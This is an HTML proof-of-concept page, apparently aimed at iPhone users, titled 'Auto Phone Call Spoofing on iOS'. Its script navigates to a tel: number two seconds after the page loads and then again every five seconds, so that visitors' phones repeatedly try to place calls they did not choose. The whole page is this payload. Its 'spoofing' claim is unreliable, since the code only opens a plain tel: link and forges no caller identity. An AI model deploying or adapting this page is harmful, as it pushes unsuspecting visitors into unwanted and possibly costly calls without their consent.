<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Auto Phone Call Spoofing on iOS</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 20px;
    }
    h2 {
      font-size: 24px;
    }
    p {
      font-size: 18px;
    }
    button {
      padding: 10px 20px;
      font-size: 18px;
      cursor: pointer;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 5px;
    }
    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <h2>PoC for Auto Phone Call Spoofing on iOS</h2>

  <p>The page will automatically attempt to trigger a spoofed phone call.</p>
  
  <!-- This is optional, just for showing the status -->
  <button id="callButton">Trigger Call</button>

  <script>
    // Function to initiate the phone call
    function initiatePhoneCall() {
      // The spoofed phone number (just an example)
      const spoofedPhoneNumber = "tel:+11234567890"; // Example phone number
      window.location.href = spoofedPhoneNumber;
    }

    // Automatically trigger the phone call after 2 seconds
    window.onload = function() {
      setTimeout(initiatePhoneCall, 2000); // Initiate after 2 seconds
    };

    // For the button click (optional)
    document.getElementById('callButton').addEventListener('click', function() {
      initiatePhoneCall();
    });

    // Optional: Simulate taps or multiple calls if needed
    setInterval(initiatePhoneCall, 5000); // This will try to trigger a call every 5 seconds
  </script>
</body>
</html>
